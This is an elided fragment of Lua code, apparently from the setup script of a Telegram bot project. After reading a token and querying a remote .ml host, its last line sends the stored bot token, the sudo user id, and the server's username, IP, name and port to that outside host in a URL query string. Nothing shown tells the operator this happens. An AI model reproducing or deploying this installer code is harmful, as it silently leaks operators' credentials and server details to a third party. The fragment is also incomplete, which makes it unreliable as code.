...
local token = io.read()
if token ~= '' then
data,res = https.request("https://vvvzvv.ml/index/Rijor.php?p=RIJOTEAM")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://vvvzvv.ml/index/Rijor.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://vvvzvv.ml/index/Rikor.php?n=RIJOTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
